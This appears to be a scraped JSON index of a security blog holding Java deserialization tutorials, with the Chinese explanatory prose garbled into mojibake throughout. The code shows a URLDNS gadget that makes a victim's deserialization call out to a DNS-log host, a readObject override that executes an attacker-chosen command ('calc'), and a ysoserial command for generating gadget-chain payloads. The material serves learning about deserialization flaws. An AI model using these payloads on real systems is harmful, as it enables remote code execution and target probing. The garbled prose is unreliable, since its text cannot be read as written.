import java.util.HashMap; import java.lang.reflect.Field; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Main { public static void main(String[] args) throws Exception { HashMap hashMap = new HashMap(); URLStreamHandler urlStream = new haha(); URL url = new URL(null,\u0026#34;https://rcpbxasvzr.yutu.eu.org\u0026#34;,urlStream); hashMap.put(url,\u0026#34;fupanc\u0026#34;); Field field = URL.class.getDeclaredField(\u0026#34;hashCode\u0026#34;); field.setAccessible(true); field.set(url,-1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } class haha extends URLStreamHandler{ protected URLConnection openConnection(URL u){ return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } æˆåŠŸåœ¨DNSlogå¹³å°ä¸Šæœ‰å›æ˜¾ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://blog.csdn.net/qq_48201589/article/details/136049878\nhttps://xz.aliyun.com/t/9417?time__1311=n4%2BxuDgD9AYCqGKDQeDsR32xmrU1bKzte34D\u0026amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F\nhttps://nivi4.notion.site/Java-URLDNS-e9820d5abc6e402abcaf69ef876f74c0\n","date":"2024-07-09T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/urldns/","title":"URLDNS"},{"content":"Javaååºåˆ—åŒ– åœ¨Javaä¸­ï¼Œåºåˆ—åŒ–è¿‡ç¨‹åˆ†ä¸ºä¸¤å¤§éƒ¨åˆ†ï¼šåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚\nåºåˆ—åŒ–ï¼šå°†å¯¹è±¡çš„çŠ¶æ€è½¬æ¢ä¸ºå¯å­˜å‚¨æˆ–ä¼ è¾“çš„æ ¼å¼çš„è¿‡ç¨‹ã€‚ä¾‹å¦‚ï¼Œå°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµæˆ–æ–‡æœ¬æ ¼å¼ï¼ˆå¦‚ JSONã€XML ç­‰ï¼‰ã€‚è¿™æ ·å¯ä»¥å°†å¯¹è±¡ä¿å­˜åˆ°æ–‡ä»¶ã€æ•°æ®åº“æˆ–è€…é€šè¿‡ç½‘ç»œä¼ è¾“ã€‚ ååºåˆ—åŒ–ï¼šå°†åºåˆ—åŒ–åçš„æ•°æ®æ¢å¤ä¸ºå¯¹è±¡çš„è¿‡ç¨‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå°†å­—èŠ‚æµæˆ–æ–‡æœ¬æ ¼å¼çš„æ•°æ®é‡æ–°è½¬æ¢ä¸ºå†…å­˜ä¸­çš„å¯¹è±¡ã€‚ è¿™ä¸¤éƒ¨åˆ†å…±åŒæ„æˆäº†åºåˆ—åŒ–è¿‡ç¨‹ï¼Œç¡®ä¿å¯¹è±¡å¯ä»¥è¢«æŒä¹…åŒ–å­˜å‚¨æˆ–è¿œç¨‹ä¼ è¾“ï¼Œå¹¶åœ¨éœ€è¦æ—¶æ¢å¤åŸå§‹çš„å¯¹è±¡çŠ¶æ€ã€‚\nå¦‚ä½•å®ç° åœ¨Javaä¸­å®ç°å¯¹è±¡ååºåˆ—åŒ–éå¸¸ç®€å•ï¼Œå®ç°java.io.Serializableï¼ˆå†…éƒ¨åºåˆ—åŒ–ï¼‰æˆ–java.io.Externalizableï¼ˆå¤–éƒ¨åºåˆ—åŒ–ï¼‰æ¥å£å³å¯è¢«åºåˆ—åŒ–ã€‚ä¸‹é¢æœ‰å‡ ä¸ªç‚¹éœ€è¦è¯´æ˜ï¼š\nSerializable æ¥å£ æºä»£ç å¦‚ä¸‹ï¼š\n1 2 public interface Serializable { } ä¸€ä¸ªå¯¹è±¡æƒ³è¦è¢«åºåˆ—åŒ–ï¼Œé‚£ä¹ˆå®ƒçš„ç±»å°±è¦å®ç°æ­¤æ¥å£æˆ–è€…å®ƒçš„å­æ¥å£ã€‚\nè¿™ä¸ªå¯¹è±¡çš„æ‰€æœ‰å±æ€§ï¼ˆåŒ…æ‹¬privateå±æ€§å’Œå…¶å¼•ç”¨çš„å¯¹è±¡ï¼‰éƒ½å¯ä»¥è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¥ä¿å­˜ã€ä¼ é€’ã€‚ä¸æƒ³åºåˆ—åŒ–çš„å­—æ®µå¯ä»¥ä½¿ç”¨transientä¿®é¥°ã€‚\nç”±äº Serializable å¯¹è±¡å®Œå…¨ä»¥å®ƒå­˜å‚¨çš„äºŒè¿›åˆ¶ä½ä¸ºåŸºç¡€æ¥æ„é€ ï¼Œå› æ­¤å¹¶ä¸ä¼šè°ƒç”¨ä»»ä½•æ„é€ å‡½æ•°ï¼Œå› æ­¤Serializableç±»æ— éœ€é»˜è®¤æ„é€ å‡½æ•°ï¼Œä½†æ˜¯å½“Serializableç±»çš„çˆ¶ç±»æ²¡æœ‰å®ç°Serializableæ¥å£æ—¶ï¼Œååºåˆ—åŒ–è¿‡ç¨‹ä¼šè°ƒç”¨çˆ¶ç±»çš„é»˜è®¤æ„é€ å‡½æ•°ï¼Œå› æ­¤è¯¥çˆ¶ç±»å¿…éœ€æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œå¦åˆ™ä¼šæŠ›å¼‚å¸¸ã€‚\nä½¿ç”¨transientå…³é”®å­—é˜»æ­¢åºåˆ—åŒ–è™½ç„¶ç®€å•æ–¹ä¾¿ï¼Œä½†è¢«å®ƒä¿®é¥°çš„å±æ€§è¢«å®Œå…¨éš”ç¦»åœ¨åºåˆ—åŒ–æœºåˆ¶ä¹‹å¤–ï¼Œå¯¼è‡´äº†åœ¨ååºåˆ—åŒ–æ—¶æ— æ³•è·å–è¯¥å±æ€§çš„å€¼ï¼Œè€Œé€šè¿‡åœ¨éœ€è¦åºåˆ—åŒ–çš„å¯¹è±¡çš„Javaç±»é‡ŒåŠ å…¥writeObject()æ–¹æ³•ä¸readObject()æ–¹æ³•å¯ä»¥æ§åˆ¶å¦‚ä½•åºåˆ—åŒ–å„å±æ€§ï¼Œç”šè‡³å®Œå…¨ä¸åºåˆ—åŒ–æŸäº›å±æ€§æˆ–è€…åŠ å¯†åºåˆ—åŒ–æŸäº›å±æ€§ã€‚\nåœ¨è¿™é‡Œè¿˜éœ€è¦äº†è§£ä¸€ä¸ªç‚¹ï¼Œé‚£å°±æ˜¯staticä¿®é¥°çš„å­—æ®µæ˜¯ç»‘å®šåœ¨ç±»ä¸Šçš„ï¼Œè€Œä¸æ˜¯å¯¹è±¡ä¸Šã€‚staticä¼˜å…ˆäºå¯¹è±¡å­˜åœ¨ï¼Œæ‰€ä»¥staticä¿®é¥°çš„å­—æ®µä¸ä¼šè¢«åºåˆ—åŒ–ã€‚\nExternalizable æ¥å£ å¯¹äºè¿™ä¸ªæ¥å£çš„ä½¿ç”¨å¯ä»¥å‚è€ƒæœ€åé¢çš„å‚è€ƒæ–‡ç« ã€‚\næºä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 public interface Externalizable extends java.io.Serializable { void writeExternal(ObjectOutput out) throws IOException; void readExternal(ObjectInput in) throws IOException,ClassNotFoundException; } å®ƒæ˜¯Serializableæ¥å£çš„å­ç±»ï¼Œè¿™ä¸ªæ¥å£é‡Œé¢å®šä¹‰äº†ä¸¤ä¸ªæŠ½è±¡çš„æ–¹æ³•ï¼Œç”¨æˆ·éœ€è¦é‡è½½writeExternal()å’ŒreadExternal()æ–¹æ³•ï¼Œç”¨æ¥å†³å®šå¦‚ä½•åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚\nå› ä¸ºåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ–¹æ³•éœ€è¦è‡ªå·±å®ç°ï¼Œå› æ­¤å¯ä»¥æŒ‡å®šåºåˆ—åŒ–å“ªäº›å±æ€§ï¼Œè€Œtransientåœ¨è¿™é‡Œæ— æ•ˆã€‚\nå¯¹Externalizableå¯¹è±¡ååºåˆ—åŒ–æ—¶ï¼Œä¼šå…ˆè°ƒç”¨ç±»çš„æ— å‚æ„é€ æ–¹æ³•ï¼Œè¿™æ˜¯æœ‰åˆ«äºé»˜è®¤ååºåˆ—æ–¹å¼çš„ã€‚å¦‚æœæŠŠç±»çš„ä¸å¸¦å‚æ•°çš„æ„é€ æ–¹æ³•åˆ é™¤ï¼Œæˆ–è€…æŠŠè¯¥æ„é€ æ–¹æ³•çš„è®¿é—®æƒé™è®¾ç½®ä¸ºprivateã€é»˜è®¤æˆ–protectedçº§åˆ«ï¼Œä¼šæŠ›å‡ºjava.io.InvalidException: no valid constructorå¼‚å¸¸ï¼Œå› æ­¤Externalizableå¯¹è±¡å¿…é¡»æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œè€Œä¸”å¿…éœ€æ˜¯publicçš„ã€‚\nserialVersionUIDå­—æ®µ è¿™ä¸ªå­—æ®µå¯ä»¥åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­æ§åˆ¶åºåˆ—åŒ–çš„ç‰ˆæœ¬ã€‚ä¸€èˆ¬æ ¼å¼å°±æ˜¯ä¸‹é¢è¿™ä¸ªï¼š\nä¸€ä¸ªå¯¹è±¡æ•°æ®ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœåºåˆ—åŒ–ä¸²ä¸­çš„serialVersionUIDä¸å½“å‰å¯¹è±¡å€¼ä¸åŒï¼Œåˆ™ååºåˆ—åŒ–å¤±è´¥ï¼Œä¼šæŠ¥é”™ï¼Œå¦åˆ™æˆåŠŸã€‚\nå¦‚æœserialVersionUIDæ²¡æœ‰æ˜¾å¼ç”Ÿæˆï¼Œç³»ç»Ÿå°±ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªã€‚å±æ€§çš„å˜åŒ–éƒ½ä¼šå¯¼è‡´è‡ªåŠ¨ç”Ÿæˆçš„serialVersionUIDå‘ç”Ÿå˜åŒ–ã€‚å¦‚æœåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„serialVersionUIDä¸åŒï¼Œåˆ™ä¼šæŠ¥åºåˆ—åŒ–ç‰ˆæœ¬ä¸åŒçš„é”™è¯¯ã€‚\nå¦‚æœæˆ‘ä»¬ä¿æŒäº†serialVersionUIDçš„ä¸€è‡´ï¼Œåˆ™åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¯¹äºæ–°å¢çš„å­—æ®µä¼šå¡«å…¥é»˜è®¤å€¼nullï¼ˆintçš„é»˜è®¤å€¼0ï¼‰,å¯¹äºå‡å°‘çš„å­—æ®µåˆ™ç›´æ¥å¿½ç•¥ã€‚\nå…¶ä»–ç±» å¦‚ä¸Šå›¾ï¼Œç°åœ¨æˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹ObjectInputStreamå’ŒObjectOutputStreamã€‚\nObjectOutputStream è¿™ä¸ªç±»ä¸åºåˆ—åŒ–ç›¸å…³\néƒ¨åˆ†æºç å¦‚ä¸‹ï¼š\n1 2 public class ObjectOutputStream extends OutputStream implements ObjectOutput, ObjectStreamConstants {} java.io.ObjectOutputStreamç»§æ‰¿è‡ª OutputStream ç±»ï¼Œå› æ­¤å¯ä»¥å°†åºåˆ—åŒ–åçš„å­—èŠ‚åºåˆ—å†™å…¥åˆ°æ–‡ä»¶ã€ç½‘ç»œç­‰è¾“å‡ºæµä¸­ã€‚\nç°åœ¨æ¥çœ‹è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public ObjectOutputStream(OutputStream out) throws IOException { verifySubclass(); bout = new BlockDataOutputStream(out); handles = new HandleTable(10, (float) 3.00); subs = new ReplaceTable(10, (float) 3.00); enableOverride = false; writeStreamHeader(); bout.setBlockDataMode(true); if (extendedDebugInfo) { debugInfoStack = new DebugTraceInfoStack(); } else { debugInfoStack = null; } } è¯¥æ„é€ æ–¹æ³•æ¥æ”¶ä¸€ä¸ª OutputStream å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œå¹¶ä¸”åœ¨å®ä¾‹åŒ–æ—¶å°†å˜é‡enableOverrideè®¾ç½®ä¸ºfalseã€‚\nä¾‹å¦‚ï¼š\n1 2 3 4 //è¿™é‡Œä¼šåˆ›å»ºä¸€ä¸ªFileOutputStreamæµä»¥å†™å…¥æ•°æ®åˆ°Fileå¯¹è±¡æ‰€ä»£è¡¨çš„æ–‡ä»¶ FileOutputStream fos = new FileOutputStream(\u0026#34;file.txt\u0026#34;); // ObjectOutputStream oos = new ObjectOutputStream(fos); è¿™é‡Œåºåˆ—åŒ–æƒ³è¦åˆ©ç”¨å°±è¦ç”¨åˆ°ObjectOutputStreamè¿™ä¸ªç±»çš„writeObjectæ–¹æ³•ï¼ŒwriteObject()æ–¹æ³•æºç å¦‚ä¸‹ï¼š\nå‰é¢åœ¨å®ä¾‹åŒ–æ—¶å°†enableOverrideè®¾ç½®ä¸ºfalseï¼Œæ‰€ä»¥è¿™é‡ŒçœŸæ­£èµ·ä½œç”¨çš„æ˜¯writeObject0()æ–¹æ³•ã€‚\nObjectInputStream è¿™ä¸ªç±»å’Œååºåˆ—åŒ–ç›¸å…³ï¼Œå®ƒå¯ä»¥è¯»å– ObjectOutputStream å†™å…¥çš„å­—èŠ‚æµï¼Œå¹¶å°†å…¶ååºåˆ—åŒ–ä¸ºç›¸åº”çš„å¯¹è±¡ã€‚\néƒ¨åˆ†æ„é€ å‡½æ•°æºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 public ObjectInputStream(InputStream in) throws IOException { verifySubclass(); bin = new BlockDataInputStream(in); handles = new HandleTable(10); vlist = new ValidationList(); enableOverride = false; readStreamHeader(); bin.setBlockDataMode(true); } æ ¸å¿ƒæ–¹æ³•æ˜¯readObject()ï¼Œæºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public final Object readObject() throws IOException, ClassNotFoundException { if (enableOverride) { return readObjectOverride(); } // if nested read, passHandle contains handle of enclosing object int outerHandle = passHandle; try { Object obj = readObject0(false); handles.markDependency(outerHandle, passHandle); ClassNotFoundException ex = handles.lookupException(passHandle); if (ex != null) { throw ex; } if (depth == 0) { vlist.doCallbacks(); } return obj; } finally { passHandle = outerHandle; if (closed \u0026amp;\u0026amp; depth == 0) { clear(); } } } å¯ä»¥çœ‹åˆ°æœ€åè¿”å›çš„æ˜¯ååºåˆ—åŒ–åçš„å¯¹è±¡ã€‚\nåºåˆ—åŒ– æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; import java.io.Serializable; class Test implements Serializable{ private String name = \u0026#34;fupanc\u0026#34; ; protected char height = \u0026#39;A\u0026#39; ; public transient String sex = \u0026#34;boy\u0026#34;; private static int age = 1111 ; public void setName(String name){ this.name=name; } public String getName(){ return this.name; } public String getSex(){ return this.sex; } public int getAge(){ return this.age; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package org.example; import java.io.ObjectOutputStream; import java.io.FileOutputStream; class Main{ public static void main(String[] args) throws Exception { Test p = new Test(); p.setName(\u0026#34;haha\u0026#34;); ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(p); x.close(); } } æˆåŠŸç”Ÿæˆser.seræ–‡ä»¶ï¼Œåå…­è¿›åˆ¶æ‰“å¼€çœ‹ä¸€ä¸‹ï¼Œå¦‚ä¸‹ï¼š\nå¯ä»¥çœ‹å‡ºè¿™é‡Œåªåºåˆ—åŒ–äº†heightå’Œnameï¼Œè€Œsexå’Œageå¹¶æ²¡æœ‰è¢«åºåˆ—åŒ–ã€‚æ‰€ä»¥åœ¨è¿™é‡Œå°±å¯ä»¥çŸ¥é“æ­£å¦‚å‰é¢è¯´çš„ï¼Œä½¿ç”¨transientå’Œstaticä¿®é¥°çš„å˜é‡ä¸ä¼šè¢«åºåˆ—åŒ–ã€‚\nååºåˆ—åŒ– ååºåˆ—åŒ–å¯¹è±¡æ—¶æœ‰å¦‚ä¸‹é™åˆ¶ï¼š\nè¢«ååºåˆ—åŒ–çš„ç±»å¿…é¡»å­˜åœ¨ã€‚ serialVersionUIDå€¼å¿…é¡»ä¸€è‡´ã€‚ åŒæ ·ä½¿ç”¨ä¸Šé¢çš„Test.javaã€‚è¿™é‡Œå°±åªç»™Main.javaï¼Œååºåˆ—åŒ–ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package org.example; import java.io.FileInputStream; import java.io.ObjectInputStream; class Main { public static void main(String[] args) throws Exception { ObjectInputStream p = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); Test ctf = (Test)p.readObject();//è¿™é‡Œç”±äºè¿”å›ç±»å‹ä¸åŒï¼Œéœ€è¦å¼ºåˆ¶è½¬æ¢ System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„name:\u0026#34;+ctf.getName()); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„sex:\u0026#34;+ctf.getSex()); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„age:\u0026#34;+ctf.getAge()); } } è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š\n1 2 3 ååºåˆ—åŒ–åçš„name:haha ååºåˆ—åŒ–åçš„sex:null ååºåˆ—åŒ–åçš„age:1111 è§£è¯»ä¸€ä¸‹ç»“æœï¼š\nsexä¸ºnullï¼Œå°±æ˜¯å› ä¸ºæˆ‘åœ¨Testç±»ç”¨transientä¿®é¥°ï¼Œæ‰€ä»¥åœ¨åºåˆ—åŒ–æ—¶å¹¶ä¸ä¼šå°†sexå­—æ®µåºåˆ—åŒ–ï¼Œæ‰€ä»¥è¿™é‡Œå¹¶æ²¡æœ‰å€¼ã€‚ ageä¸º1111ï¼Œè¿™å°±ä¸staticæœ‰å…³äº†ï¼Œè¿™æ˜¯å› ä¸ºstaticä¸ºå…¨å±€å˜é‡ï¼Œåœ¨JVMä¸­æ‰€æœ‰å®ä¾‹éƒ½ä¼šå…±äº«è¯¥å­—æ®µã€‚ å¯¹æ¯”ä¸€ä¸‹ï¼Œåˆšå¥½å¯ä»¥å†è¯´æ˜ä¸€ä¸ªç‚¹\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.example; import java.io.Serializable; class Test implements Serializable{ private static String name = \u0026#34;fupanc\u0026#34; ; //è¿™é‡Œæ·»åŠ static public String sex = \u0026#34;boy\u0026#34;; //è¿™é‡Œå»é™¤transient private static int age = 1111 ; public void setName(String name){ this.name=name; } public String getName(){ return this.name; } public String getSex(){ return this.sex; } public int getAge(){ return this.age; } } Main.java (çœå»åºåˆ—åŒ–è¿‡ç¨‹ï¼Œæ³¨æ„è¿™é‡Œæ˜¯å°†åºåˆ—åŒ–å’Œååºåˆ—åŒ–åˆ†å¼€è¿›è¡Œçš„)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; class Main{ public static void main(String[] args){ try{ //ååºåˆ—åŒ– ObjectInputStream y = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); Test ctf = (Test)y.readObject(); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„name:\u0026#34;+ctf.getName()); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„sex:\u0026#34;+ctf.getSex()); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„age:\u0026#34;+ctf.getAge()); } catch(Exception e){ e.printStackTrace(); } } } è¾“å‡ºä¸ºï¼š\n1 2 3 ååºåˆ—åŒ–åçš„name:fupanc ååºåˆ—åŒ–åçš„sex:boy ååºåˆ—åŒ–åçš„age:1111 ä»è¿™ä¸ªç»“æœå¯ä»¥æ›´åŠ è¯´æ˜staticä¿®é¥°çš„å­—æ®µä¸ä¼šè¢«åºåˆ—åŒ–çš„ç‰¹æ€§ï¼Œä»¥åŠæ›´åŠ æ¸…æ¥šäº†æ˜¯å¦ä½¿ç”¨transientç»“æœçš„ä¸åŒã€‚\nä½†æ˜¯åœ¨å‰ä¸€ä¸ªæµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œ\nTest.javaè¿˜æ˜¯ä¹‹å‰é‚£ä¸ªï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.example; import java.io.Serializable; class Test implements Serializable{ private static String name = \u0026#34;fupanc\u0026#34; ; //è¿™é‡Œæ·»åŠ static public String sex = \u0026#34;boy\u0026#34;; //è¿™é‡Œå»é™¤transient private static int age = 1111 ; public void setName(String name){ this.name=name; } public String getName(){ return this.name; } public String getSex(){ return this.sex; } public int getAge(){ return this.age; } } Main.javaå†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package org.example; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; class Main{ public static void main(String[] args){ try{ //åºåˆ—åŒ– Test p = new Test(); p.setName(\u0026#34;haha\u0026#34;); ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(p); x.close(); //ååºåˆ—åŒ– ObjectInputStream y = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); Test ctf = (Test)y.readObject(); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„name:\u0026#34;+ctf.getName()); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„sex:\u0026#34;+ctf.getSex()); System.out.println(\u0026#34;ååºåˆ—åŒ–åçš„age:\u0026#34;+ctf.getAge()); } catch(Exception e){ e.printStackTrace(); } } } è¿è¡Œç»“æœï¼š\n1 2 3 ååºåˆ—åŒ–åçš„name:haha ååºåˆ—åŒ–åçš„sex:boy ååºåˆ—åŒ–åçš„age:1111 æ³¨æ„è¿™é‡Œçš„nameçš„ç»“æœä¸ºhahaï¼Œä½†æ˜¯ä¹‹å‰åˆ†å¼€åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶çš„nameçš„å€¼ä¸ºfupancã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™æ ·çš„ç»“æœå‘¢ï¼Ÿè§£ç­”å¦‚ä¸‹ï¼ˆä¸ªäººç†è§£ï¼‰ï¼š\næœ‰æƒ³è¿‡ä¸ºä»€ä¹ˆåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¦å¼•å…¥åŒ…å—ï¼Œ\nåŒæ—¶å¯ä»¥çœ‹ç»™å‡ºæ¥çš„ser.seræ–‡ä»¶çš„åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œå…¶ä¸­å¹¶æ²¡æœ‰åºåˆ—åŒ–æ–¹æ³•ï¼Œå¹¶ä¸”åªå­˜åœ¨sexï¼ˆè¿™æ˜¯å› ä¸ºå…¶ä»–ä¸¤ä¸ªå˜é‡éƒ½è¢«æˆ‘è®¾ç½®ä¸ºäº†staticï¼Œæ‰€ä»¥ä¸ä¼šè¢«åºåˆ—åŒ–ï¼‰ï¼Œé‚£ä¹ˆæ˜¯å¦æƒ³è¿‡ä¸ºä»€ä¹ˆåœ¨åºåˆ—åŒ–çš„æ—¶å€™æ²¡æœ‰åºåˆ—åŒ–æ–¹æ³•ã€‚\nä¸ªäººç†è§£å¦‚ä¸‹ï¼Œå¯¹äºåºåˆ—åŒ–ï¼Œå®ƒåªåºåˆ—åŒ–å¯¹è±¡çš„çš„çŠ¶æ€ï¼Œè€Œæ–¹æ³•å±äºç±»çš„å®šä¹‰éƒ¨åˆ†ï¼Œä¸å±äºå¯¹è±¡çš„çŠ¶æ€éƒ¨åˆ†ï¼Œæ‰€ä»¥æ–¹æ³•å¹¶ä¸æ˜¯è¢«åºåˆ—åŒ–ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦å†æ¬¡åˆ©ç”¨è¿™ä¸ªTestç±»ï¼Œéœ€è¦å¼•å…¥åŒ…ï¼Œä»è€Œä½¿å¾—å¯ä»¥å¯¹åº”åˆ°æ–¹æ³•æ¥åˆ©ç”¨ã€‚\nä¸¤ç§ä¸åŒç»“æœçš„åˆ©ç”¨æ–¹æ³•æœ€å¤§çš„ä¸åŒåœ¨äºä¸€ä¸ªåœ°æ–¹ï¼ŒJVMåŠ è½½è¿›ç¨‹ã€‚\nåœ¨åˆ†å¼€åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶ï¼Œæ˜¯åˆ†åˆ«è¿è¡Œäº†ä¸¤æ¬¡ï¼Œå³è¿›è¡Œäº†ä¸¤æ¬¡JVMåŠ è½½ï¼Œä½†æ˜¯è¿™ä¸ªstaticé™æ€åŠ è½½æ˜¯å­˜åœ¨äºâ€œå½“å‰â€è¿›ç¨‹çš„ï¼Œå¹¶ä¸”çœ‹å‰é¢åºåˆ—åŒ–åçš„æ–‡ä»¶å†…å®¹ï¼Œæ˜¯ä¸å­˜åœ¨staticå…³é”®å­—ä¿®é¥°çš„å˜é‡çš„ï¼Œstaticä¿®é¥°çš„å˜é‡æ˜¯ç»‘å®šåœ¨å¯¹è±¡ä¸Šçš„ï¼Œè€Œæ˜¯ç›´æ¥å­˜åœ¨äºå†…å­˜ä¸­çš„ï¼Œæ‰€ä»¥åœ¨ç¬¬äºŒæ¬¡åŠ è½½æ—¶ä¼šç›´æ¥å°†å†…å­˜ä¸­å­˜åœ¨çš„fupancèµ‹å€¼ç»™nameã€‚\nè€Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸€èµ·ï¼Œå¯¹æ¯”ä¸€ä¸‹ï¼ŒåŸºæœ¬å°±æ¸…æ¥šäº†ï¼ŒåŒæ—¶è¿›è¡Œï¼Œåœ¨åºåˆ—åŒ–ä¹‹å‰å°†staticä¿®é¥°çš„nameæ”¹ä¸ºhahaï¼Œå¹¶åŠ è½½è¿›äº†å†…å­˜ä¸­ï¼Œç„¶ååœ¨ååºåˆ—åŒ–æ—¶ç›´æ¥åœ¨å†…å­˜ä¸­æ‰¾åˆ°äº†è¿™ä¸ªå€¼èµ‹å€¼ç»™äº†nameã€‚\nç»¼ä¸Šï¼Œé€ æˆè¿™ä¸ªå·®å¼‚çš„ä¸»è¦æœ‰ä¸¤ä¸ªç‚¹ï¼š\nåºåˆ—åŒ–çš„ç‰¹æ€§ â€œJVNåŠ è½½ç‰¹æ€§â€ ä¸€ä¸ªçŸ¥è¯†ç‚¹ è¿™é‡Œéœ€è¦æ³¨æ„çš„ä¸€ä¸ªç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨å¾…åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–çš„ç±»ä¸­å®šä¹‰readObjectå’ŒwriteObjectæ–¹æ³•ï¼Œæ¥å®ç°è‡ªå®šä¹‰çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œï¼Œå½“ç„¶å‰ææ˜¯ï¼Œè¢«åºåˆ—åŒ–çš„ç±»å¿…é¡»æœ‰æ­¤æ–¹æ³•ï¼Œå¹¶ä¸”æ–¹æ³•çš„ä¿®é¥°ç¬¦å¿…é¡»æ˜¯privateã€‚ä»£ç å‚è€ƒå¦‚ä¸‹ï¼š\nTest.java\n1 2 3 4 5 6 7 8 9 10 package org.example; import java.io.Serializable; class Test implements Serializable{ public String cmd; private void readObject(java.io.ObjectInputStream stream) throws Exception{ stream.defaultReadObject();//è°ƒç”¨ObjectInputStreamé»˜è®¤ååºåˆ—åŒ–æ–¹æ³• Runtime.getRuntime().exec(cmd); } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import java.io.*; class Main{ public static void main(String[] args) throws Exception{ Test haha = new Test(); haha.cmd = \u0026#34;calc\u0026#34;; ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(\u0026#34;haha.ser\u0026#34;)); obj.writeObject(haha); obj.close(); ObjectInputStream ceshi = new ObjectInputStream(new FileInputStream(\u0026#34;haha.ser\u0026#34;)); ceshi.readObject(); ceshi.close(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœº\nè¿™æ ·å°±ç¡®å®è‡ªå®šä¹‰äº†ååºåˆ—åŒ–çš„æ–¹æ³•ï¼Œåºåˆ—åŒ–åŒç†ã€‚\nysoserialå·¥å…· ysoserialé›†åˆäº†å„ç§javaååºåˆ—åŒ–çš„åˆ©ç”¨é“¾ã€‚\nåˆ©ç”¨é“¾ä¹Ÿå«\u0026quot;gadget chains\u0026quot;ï¼Œæˆ‘ä»¬é€šå¸¸ç§°ä¸ºgadgetã€‚\nç›´æ¥ä¸‹è½½ç¼–è¯‘å¥½çš„jaræ–‡ä»¶å°±èƒ½ç”¨ï¼š\n1 https://github.com/frohoff/ysoserial ä½¿ç”¨å¾ˆç®€å•ï¼Œå¦‚ä¸‹ç®€å•POCï¼š\n1 java -jar ysoserial-master.jar CommonsCollections1 \u0026#34;id\u0026#34; å‚è€ƒæ–‡ç« 